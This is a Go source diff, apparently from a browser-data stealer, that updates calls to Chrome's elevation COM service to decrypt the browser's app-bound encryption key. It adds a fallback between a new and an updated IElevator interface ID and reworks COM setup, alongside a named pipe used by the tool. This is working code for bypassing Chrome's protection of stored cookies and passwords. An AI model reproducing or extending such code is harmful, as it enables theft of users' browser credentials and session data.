@@ -45,7 +45,8 @@ var pipeName string = `\\.\pipe\chromepipe`
 
 var (
 	CLSID_ChromeElevator = GUID{0x708860E0, 0xF641, 0x4611, [8]byte{0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}}
-	IID_IElevator        = GUID{0x463ABECF, 0x410D, 0x407F, [8]byte{0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}}
+	IID_IElevator        = GUID{0xA949CB4E, 0xC4F9, 0x44C4, [8]byte{0xB2, 0x13, 0x6B, 0xF8, 0xAA, 0x9A, 0xC6, 0x9C}}
+	IID_IElevator2Chrome = GUID{0x1BF5208B, 0x295F, 0x4992, [8]byte{0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38}}
 )
 
 func init() {
@@ -107,13 +108,51 @@ func connectPipe() bool {
 	return false
 }
 
+var comInitialized bool
+
 func initCOM() bool {
 	hr, _, _ := wincall.CallG0(coInitializeEx, uintptr(0), uintptr(0x2))
-	return hr == 0 || hr == 1
+	if hr == 0 {
+		comInitialized = true
+		return true
+	} else if hr == 1 {
+		comInitialized = false
+		return true
+	}
+	comInitialized = false
+	return false
 }
 
 func uninitCOM() {
-	wincall.CallG0(coUninitialize)
+	if comInitialized {
+		wincall.CallG0(coUninitialize)
+	}
+}
+
+func tryCreateElevator() (uintptr, error) {
+	var pElevator uintptr
+	hr, _, _ := wincall.CallG0(coCreateInstance,
+		uintptr(unsafe.Pointer(&CLSID_ChromeElevator)),
+		uintptr(0),
+		uintptr(CLSCTX_LOCAL_SERVER),
+		uintptr(unsafe.Pointer(&IID_IElevator2Chrome)),
+		uintptr(unsafe.Pointer(&pElevator)),
+	)
+	if hr == 0 {
+		return pElevator, nil
+	}
+
+	hr, _, _ = wincall.CallG0(coCreateInstance,
+		uintptr(unsafe.Pointer(&CLSID_ChromeElevator)),
+		uintptr(0),
+		uintptr(CLSCTX_LOCAL_SERVER),
+		uintptr(unsafe.Pointer(&IID_IElevator)),
+		uintptr(unsafe.Pointer(&pElevator)),
+	)
+	if hr == 0 {
+		return pElevator, nil
+	}
+	return 0, fmt.Errorf("CoCreateInstance failed: 0x%x", hr)
 }
 
 func decryptKey(encryptedKey []byte) ([]byte, error) {
@@ -126,19 +165,12 @@ func decryptKey(encryptedKey []byte) ([]byte, error) {
 	}
 	defer wincall.CallG0(sysFreeString, bstrEnc)
 
-	var pElevator uintptr
-	hr, _, _ := wincall.CallG0(coCreateInstance,
-		uintptr(unsafe.Pointer(&CLSID_ChromeElevator)),
-		uintptr(0),
-		uintptr(CLSCTX_LOCAL_SERVER),
-		uintptr(unsafe.Pointer(&IID_IElevator)),
-		uintptr(unsafe.Pointer(&pElevator)),
-	)
-	if hr != 0 {
-		return nil, fmt.Errorf("CoCreateInstance failed: 0x%x", hr)
+	pElevator, err := tryCreateElevator()
+	if err != nil {
+		return nil, err
 	}
 
-	hr, _, _ = wincall.CallG0(coSetProxyBlanket,
+	hr, _, _ := wincall.CallG0(coSetProxyBlanket,
 		pElevator,
 		uintptr(0xFFFFFFFF),
 		uintptr(0xFFFFFFFF),
